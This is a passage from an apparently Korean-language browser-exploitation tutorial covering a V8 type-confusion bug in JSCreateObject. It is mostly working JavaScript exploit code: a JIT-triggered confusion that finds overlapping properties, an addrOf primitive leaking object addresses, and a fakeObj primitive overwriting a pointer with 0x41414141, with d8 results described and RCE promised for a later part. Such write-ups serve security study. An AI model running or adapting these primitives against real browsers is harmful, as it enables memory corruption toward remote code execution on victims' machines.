    pValues[p1] = {x: 13.37}; // Double (예상 타입)
    pValues[p2] = {y: obj}; // Object (실제 로드되는 값)

    // 2. JIT 최적화 및 타입 혼동 유도
    for (let i = 0; i < 10000; i++) {
        let res = vuln(makeObj(pValues));
        // 반환 값이 13.37이 아니면 (즉, 주소가 유출되면) 성공
        if (res != 13.37) {
            return res.toBigInt() - 1n; // 주소 반환 및 태그 제거
        }
    }
    throw "[!] AddrOf Primitive Failed"
}
```

아래는 위 함수가 포함된 Read Primitive 코드입니다(포인터 태그를 제거하는 코드를 원하시면 위 함수의 코드로 바꿔서 사용하시면 됩니다).

```c
// Function that creates an object with one in-line and 32 out-of-line properties
function makeObj(pValues) {
    let obj = {inline: 1234};
    for (let i = 0; i < 32; i++) {
        Object.defineProperty(obj, 'p' + i, {
            writable: true,
            value: pValues[i]
        });
    }
    return obj;
}
// Function that finds a pair of properties where p1 is stored at the same offset
// in the FixedArray as p2 in the NameDictionary
let p1, p2;

function findOverlappingProperties() {
    // Create an array of all 32 property names such as p1..p32
    let pNames = [];
    for (let i = 0; i < 32; i++) {
        pNames[i] = 'p' + i;
    }

    // Create eval of our vuln function that will generate code during runtime
    eval(`
    function vuln(obj) {
      // Access Property inline of obj, forcing a CheckMap operation
      obj.inline;
      // Force a Map Transition via our side-effect
      this.Object.create(obj);
      // Trigger our type-confusion by accessing out-of-bound properties
      ${pNames.map((p) => `let ${p} = obj.${p};`).join('\n')}
      return [${pNames.join(', ')}];
    }
  `)

    // Create an array of negative values from -1 to -32 to be used
    // for out makeObj function
    let pValues = [];
    for (let i = 1; i < 32; i++) {
        pValues[i] = -i;
    }

    // JIT code to trigger vuln
    for (let i = 0; i < 10000; i++) {
        // Create Object and pass it to Vuln function
        let res = vuln(makeObj(pValues));
        // Look for overlapping properties in results
        for (let i = 1; i < res.length; i++) {
            // If i is not the same value, and res[i] is between -32 and 0, it overlaps
            if (i !== -res[i] && res[i] < 0 && res[i] > -32) {
                [p1, p2] = [i, -res[i]];
                return;
            }
        }
    }
    throw "[!] Failed to find overlapping properties";
}

function addrOf() {
    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      // Trigger our type-confusion by accessing an out-of-bound property
        // This will load p1 from our object thinking it's a Double, but instead
        // due to overlap, it will load p2 which is an Object
      return obj.p${p1}.x;
    }
  `);

    let obj = {z: 1234};
    let pValues = [];
    pValues[p1] = {x: 13.37};
    pValues[p2] = {y: obj};

    for (let i = 0; i < 10000; i++) {
        let res = vuln(makeObj(pValues));
        if (res != 13.37) {
            %DebugPrint(obj);
            return res;
        }
    }
    throw "[!] AddrOf Primitive Failed"
}

print("[+] Finding Overlapping Properties...");
findOverlappingProperties();
print(`[+] Properties p${p1} and p${p2} overlap!`);
let x = addrOf();
print("[+] Leaking Object Address...");
print(`[+] Object Address: ${x}`);
```

위 코드를 d8에서 실행시켜보면 다음의 결과를 얻을 수 있습니다.

![image.png](image%209.png)

`Object Address` 로 나오는 결과는 double 로 인식되어서 double 표기법으로 출력이 됩니다. 따라서 이를 주소로 변환해주는 과정이 필요해서 위와 같이 변환해주면 주소를 얻을 수 있습니다!

### The fakeObj Write Primitive

Write primitive는 다른 취약점을 찾을 필요없이 Read Primitive를 반대로만 하면 얻을 수 있습니다. 이런 점이 Type Confusion 취약점의 강점이라고 생각이 드는데요. 포인터 타입이 double 타입으로 Type Confusion 이 되어 double을 읽으려했는데 포인터 주소가 읽혔던 것처럼, double 타입에 값을 쓰려고 했는데 Type Confusion으로 인하여 포인터 주소에 값이 쓰여지도록 유도하면 됩니다.

```jsx
function fakeObj() {
    eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      let orig = obj.p${p1}.x;
      // Overwrite property x of p1, but due to type confusion
      // we overwrite property y of p2
      obj.p${p1}.x = 0x41414141n;
      return orig;
    }
  `);

    let obj = {z: 1234};
    let pValues = [];
    pValues[p1] = {x: 13.37};
    pValues[p2] = {y: obj};

    for (let i = 0; i < 10000; i++) {
        let res = vuln(makeObj(pValues));
        if (res != 13.37) {
            return res;
        }
    }
}
```

위 코드를 Read primitive 코드에서 `let x = addrOf();` 부분을 `fakeObj()` 함수로 변경 후 d8에서 실행하면 아래와 같이 결과를 얻을 수 있습니다. 보시는 것처럼 obj라는 포인터 주소가 0x41414141로 변경됨을 확인할 수 있습니다. 간단하게 primitive를 얻을 수 있는 Type Confusion 참 매력적이지 않나요? ㅎㅋ

![image.png](image%2010.png)

이제 주소를 읽을 수 있는 read primitive와 객체의 주소를 쓸 수 있는 write primitive를 얻었으니, 이를 exploit을 위해 임의 메모리 읽기/쓰기(AAR/AAW) primitive로 정교하게 다듬어 보려고 하였으나, 분량 조절 실패도 있고 조금 더 퀄리티 있는 글을 쓰고 싶어서 다음 파트로 넘기겠습니다..

다음 파트에서는 크롬(렌더러 프로세스)에서의 Read/Write primitive가 RCE로 어떻게 이어지는지 알아보고 Heap Sandbox가 나온 후의 렌더러 RCE는 어떻게 변화했는지 알아보도록 하겠습니다! ~~(가능하면..)~~ 곧 돌아올게요 :)

# Reference

[https://jhalon.github.io/chrome-browser-exploitation-1/](https://jhalon.github.io/chrome-browser-exploitation-1/)

[https://jhalon.github.io/chrome-browser-exploitation-2/](https://jhalon.github.io/chrome-browser-exploitation-2/)

[https://jhalon.github.io/chrome-browser-exploitation-3/](https://jhalon.github.io/chrome-browser-exploitation-3/)

[https://ssd-disclosure.com/ssd-advisory-chrome-type-confusion-in-jscreateobject-operation-to-rce/](https://ssd-disclosure.com/ssd-advisory-chrome-type-confusion-in-jscreateobject-operation-to-rce/)